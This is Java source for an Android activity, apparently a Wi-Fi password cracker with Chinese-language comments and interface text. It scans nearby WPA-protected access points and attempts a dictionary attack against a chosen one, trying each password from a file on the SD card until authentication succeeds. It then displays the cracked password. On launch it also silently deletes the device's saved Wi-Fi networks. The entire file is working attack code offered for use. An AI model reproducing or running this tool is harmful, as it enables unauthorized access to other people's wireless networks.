package wificrack;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiConfiguration.Status;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.Preference.OnPreferenceClickListener;
import android.preference.PreferenceActivity;
import android.preference.PreferenceFragment;  
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MenuItem.OnMenuItemClickListener;

import java.io.FileNotFoundException;
import java.util.List;

public class WiFiCrackActivity extends PreferenceActivity{
    private WifiManager wm;
    private WifiReceiver wifiReceiver;
    private AccessPoint ap;
    private AccessPoint tmpap;
    private Preference preference;
    private String password;
    private List<WifiConfiguration> configs;
    private IntentFilter intentFilter;
    private PasswordGetter passwordGetter;
    private boolean cracking;
    private WifiConfiguration config;
    private int netid;
    private static final String TAG = "==WifiCracker==";
    List<ScanResult> results;
    ScanResult result;
    
    @SuppressWarnings("deprecation")
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
     //   setContentView(R.layout.main);
        
        try {
			passwordGetter = new PasswordGetter("/sdcard/password.txt");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

        wm = (WifiManager) getSystemService(WIFI_SERVICE);
        if(!wm.isWifiEnabled())
            wm.setWifiEnabled(true);    //开启WIFI
        
        //disableSavedConfigs();
        deleteSavedConfigs();
        cracking = false;
        netid = -1;
        
        wifiReceiver = new WifiReceiver();
        intentFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        registerReceiver(wifiReceiver, intentFilter);
        
        wm.startScan(); //开始扫描网络  
    }
           
    @Override
    protected void onStop() {
        unregisterReceiver(wifiReceiver);
        super.onStop();
    }

    @Override
    protected void onResume() {
        registerReceiver(wifiReceiver, intentFilter);        
        super.onResume();
    }  
    

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("扫描").setOnMenuItemClickListener(new OnMenuItemClickListener() {
            
            @SuppressWarnings("deprecation")
			public boolean onMenuItemClick(MenuItem item) {
                if (!cracking){
                    results = null;
                    getPreferenceScreen().removeAll();
                    deleteSavedConfigs();
                    wm.startScan();
                }
                return true;
            }
        });
        menu.add("停止").setOnMenuItemClickListener(new OnMenuItemClickListener() {
            
            public boolean onMenuItemClick(MenuItem item) {
                if (cracking){
                    cracking = false;
                    enablePreferenceScreens(true);                    
                }
                return true;
            }
        });
        return super.onCreateOptionsMenu(menu);
    }
    
    class WifiReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {        
            String action = intent.getAction();
            if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(action)) {
                if (results == null)    //只初始化一次
                    results = wm.getScanResults();
                try {
                    setTitle("WIFI连接点个数为:"
                            + String.valueOf(getPreferenceScreen().getPreferenceCount()));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if( cracking == false)  //破解WIFI密码时不更新界面
                    update();                
            } else if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION.equals(action)) {
                WifiInfo info = wm.getConnectionInfo();
                SupplicantState state = info.getSupplicantState();
                String str = null;
                if (state == SupplicantState.ASSOCIATED){
                    str = "关联AP完成";
                } else if(state.toString().equals("AUTHENTICATING")/*SupplicantState.AUTHENTICATING*/){
                    str = "正在验证";
                } else if (state == SupplicantState.ASSOCIATING){
                    str = "正在关联AP...";
                } else if (state == SupplicantState.COMPLETED){
                    if(cracking) {
                        cracking = false;
                        showMessageDialog("恭喜您，密码跑出来了！", "密码为："
                                + AccessPoint.removeDoubleQuotes(password), 
                                "确定", false, new OnClickListener(){
    
                            public void onClick(DialogInterface dialog, int which) {
                                wm.disconnect();
                                enablePreferenceScreens(true);
                            }                        
                        });
                        cracking = false;
                        return;
                    } else
                        str = "已连接";
                } else if (state == SupplicantState.DISCONNECTED){
                    str = "已断开";
                } else if (state == SupplicantState.DORMANT){
                    str = "暂停活动";
                } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE){
                    str = "四路握手中...";
                } else if (state == SupplicantState.GROUP_HANDSHAKE){
                    str = "GROUP_HANDSHAKE";
                } else if (state == SupplicantState.INACTIVE){
                    str = "休眠中...";
                    if (cracking) connectNetwork(); //连接网络     
                } else if (state == SupplicantState.INVALID){
                    str = "无效";
                } else if (state == SupplicantState.SCANNING){
                    str = "扫描中...";
                } else if (state == SupplicantState.UNINITIALIZED){
                    str = "未初始化";
                }
                setTitle(str);
                final int errorCode = intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                    Log.d(TAG, "WIFI验证失败！");
                    setTitle("WIFI验证失败！");
                    if( cracking == true)
                        connectNetwork();
                }
            }            
        }           
    } 
    
    private void deleteSavedConfigs(){
        configs = wm.getConfiguredNetworks();
        for (int i = 0; i < configs.size(); i++) {
            config = configs.get(i);
            config.priority = i + 2;    //将优先级排后
            wm.removeNetwork(config.networkId); 
        }
        wm.saveConfiguration();
    }
    /**
     * 禁用已保存的WIFI网络
     */
    @SuppressWarnings("unused")
    private void disableSavedConfigs(){
        configs = wm.getConfiguredNetworks();
        for (int i = 0; i < configs.size(); i++) {
            config = configs.get(i);
            config.priority = i + 2;    //将优先级排后
            config.status = Status.DISABLED;//禁用所有已保存的networks
            //wm.removeNetwork(config.networkId); 
            Log.d(TAG, String.valueOf(config.networkId)+ "->" +config.SSID);
            addPreferencesFromResource(com.ndsec.wifisec.R.xml.wifi_access_points);   //添加一项
            preference = findPreference("wifi_accesspoint");
            preference.setKey(AccessPoint.removeDoubleQuotes(config.SSID));     //重新设置key
            preference.setTitle(AccessPoint.removeDoubleQuotes(config.SSID));
            preference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
                
                public boolean onPreferenceClick(Preference pre) {
                    configs = wm.getConfiguredNetworks();
                    for (int i = 0; i < configs.size(); i++){
                        config = configs.get(i);
                        if(AccessPoint.removeDoubleQuotes(config.SSID).equals(pre.getTitle().toString()))break; //根据SSID获取ScanResult
                    }
                    tmpap = new AccessPoint(WiFiCrackActivity.this, config);
                    Log.d(TAG, tmpap.toString());
                    checkAP();
                    return true;
                }
            });
            preference.setSummary("信号强度：不在范围内");  
        }
        wm.saveConfiguration();     //保存更改
    }
    
    /**
     * 启用或禁用所有列表项
     * @param bEnable
     */
    private void enablePreferenceScreens(boolean bEnable){
        int count = getPreferenceScreen().getPreferenceCount();
        for (int i = 0; i < count; i++) {
            Preference  preference = getPreferenceScreen().getPreference(i);
            preference.setEnabled(bEnable);
        }
    }
    
    /**
     * 更新扫描到的AP
     */
    private void update() {
        addPreferenceFromScanResult();
    }
    
    /**
     * 将扫描AP的结果添加到程序
     */
    private void addPreferenceFromScanResult(){
        if (results == null) return;
        for (int i = 0; i < results.size(); i++){
            final ScanResult sr = results.get(i);
            tmpap = new AccessPoint(WiFiCrackActivity.this, sr);
            
            preference = findPreference(sr.SSID);
            if (preference != null){
                Log.d(TAG, "更新SSID：" + sr.SSID);
                wm.updateNetwork(tmpap.mConfig);   //更新
                wm.saveConfiguration();
                preference.setSummary("信号强度：" + String.valueOf(tmpap.getLevel()));   
                continue;
            }
            addPreferencesFromResource(com.ndsec.wifisec.R.xml.wifi_access_points);   //添加一项
            preference = findPreference("wifi_accesspoint");
            preference.setKey(sr.SSID);     //重新设置key
            preference.setTitle(sr.SSID);
            preference.setSummary("信号强度：" + String.valueOf(tmpap.getLevel()));                
            preference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
                
                public boolean onPreferenceClick(Preference pre) {  //WIFI网络列表点击事件处理
                    for (int i = 0; i < results.size(); i++){
                        result = results.get(i);
                        if(result.SSID == pre.getTitle())break; //根据SSID获取ScanResult
                    }
                    tmpap = new AccessPoint(WiFiCrackActivity.this, result);
                    checkAP();        
                    return true;
                }                             
            });
        }
    }
    
    private void checkAP() {
        if (tmpap.security == AccessPoint.SECURITY_NONE) {
            setTitle("该AP没有加密，不需要破解！");
            return;
        } else if((tmpap.security == AccessPoint.SECURITY_EAP) || (tmpap.security == AccessPoint.SECURITY_WEP)){
            setTitle("暂不支持EAP与WEP加密方式的破解！");
            return;
        }

        showMessageDialog("WIFI热点信息", tmpap.toString(), "破解", true, new OnClickListener() {                
            public void onClick(DialogInterface dialog, int which) {
                cracking = true;
                setTitle("正在破解...");
                try {
                    ap = tmpap;
                    connectNetwork(); //连接网络
                    enablePreferenceScreens(false);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });       
        
    }
    
    private void connectNetwork() {
        if (cracking) {
            ap.mConfig.priority = 1;
            ap.mConfig.status = WifiConfiguration.Status.ENABLED;
            password = passwordGetter.getPassword();    //从外部字典加载密码
            if (password == null || password.length() == 0){
                setTitle("密码本已猜解完毕，没有跑出密码！");
                cracking = false;
                showMessageDialog("提示", "是否重置密码本？", "破解", true, new OnClickListener() {                
                    public void onClick(DialogInterface dialog, int which) {
                        passwordGetter.reSet();                    
                    }
                });
                enablePreferenceScreens(true);
                return;
            }
            password = "\"" + password + "\"";
            ap.mConfig.preSharedKey = password;     //设置密码
            Log.d(TAG, ap.toString());
            if(netid == -1) {
                netid = wm.addNetwork(ap.mConfig);
                ap.mConfig.networkId = netid;
                Log.d(TAG, "添加AP失败");
            } else
                wm.updateNetwork(ap.mConfig);
            setTitle("尝试连接:" + ap.mConfig.SSID + "密码:" + ap.mConfig.preSharedKey);
            //enableNetwork、saveConfiguration、reconnect为connectNetwork的实现       
            if(wm.enableNetwork(netid, false))
                setTitle("启用网络失败");
            wm.saveConfiguration();
            wm.reconnect(); //连接AP
        }
    }
    
    private void showMessageDialog(String title, String message, String positiveButtonText, boolean bShowCancel, DialogInterface.OnClickListener positiveButtonlistener) {
        AlertDialog.Builder builder = new Builder(WiFiCrackActivity.this);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setPositiveButton(positiveButtonText, positiveButtonlistener);
        if (bShowCancel){
            builder.setNegativeButton("取消", new OnClickListener() {                
                public void onClick(DialogInterface dialog, int which) {                    
                }
            });
        }
        builder.create().show();
    }

    @Override
    protected void onDestroy() {
        if (passwordGetter != null)
            passwordGetter.Clean();
        super.onDestroy();
    }    
}
